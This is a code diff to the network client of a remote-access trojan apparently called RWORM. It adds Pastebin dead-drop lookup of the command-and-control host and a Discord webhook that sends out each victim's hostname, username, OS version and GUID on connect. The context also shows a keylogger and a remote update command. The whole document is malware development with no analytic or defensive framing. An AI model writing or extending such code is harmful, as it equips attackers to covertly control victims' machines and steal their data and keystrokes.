@@ -52,6 +52,13 @@ namespace RWORM.Client.Network
             {
                 try
                 {
+                    if (!string.IsNullOrWhiteSpace(Config.PastebinRaw))
+                    {
+                        await ResolvePastebinHostAsync().ConfigureAwait(false);
+                        host = Config.C2Host;
+                        port = Config.C2Port;
+                    }
+
                     var client = new TcpClient();
                     using (var timeout = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token))
                     {
@@ -66,6 +73,18 @@ namespace RWORM.Client.Network
                     delay = Config.ReconnectDelay;   // healthy session → reset backoff
 
                     await SendSystemInfo();
+
+                    if (Config.DiscordAlert && !string.IsNullOrWhiteSpace(Config.DiscordWebhook))
+                    {
+                        var ep = client.Client.RemoteEndPoint?.ToString() ?? "";
+                        _ = DiscordNotifier.SendConnectAlertAsync(
+                            Config.DiscordWebhook,
+                            Config.GetHostname(),
+                            Config.GetUsername(),
+                            Config.GetOSVersion(),
+                            ep,
+                            Config.GetGuid());
+                    }
 
                     // Online keylogger starts after connect
                     if (Config.KeyloggerEnabled && Config.KeyloggerOnline)
@@ -124,6 +143,26 @@ namespace RWORM.Client.Network
             // One side saw the socket die — stop the other and surface faults.
             sessionCts.Cancel();
             try { await Task.WhenAll(receive, heartbeat); } catch { }
+        }
+
+        private static async Task ResolvePastebinHostAsync()
+        {
+            try
+            {
+                using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(6) };
+                var raw = (await http.GetStringAsync(Config.PastebinRaw).ConfigureAwait(false)).Trim();
+                var parts = raw.Split(':');
+                if (parts.Length == 2 && int.TryParse(parts[1], out int p))
+                {
+                    Config.C2Host = parts[0].Trim();
+                    Config.C2Port = p;
+                }
+                else if (parts.Length == 1 && !string.IsNullOrWhiteSpace(parts[0]))
+                {
+                    Config.C2Host = parts[0].Trim();
+                }
+            }
+            catch { }
         }
 
         private async Task RunConnectTask()
@@ -346,9 +385,11 @@ namespace RWORM.Client.Network
 
                 // ── Client control ─────────────────────────────────────────
                 case 0xA0: // CLIENT_CLOSE
+                    Watchdog.PrepareCleanExit();
                     Environment.Exit(0);
                     break;
                 case 0xA1: // CLIENT_UNINSTALL
+                    Watchdog.PrepareCleanExit();
                     LoaderModule.Uninstall(); // exits
                     break;
                 case 0xA2: // CLIENT_UPDATE — payload = URL
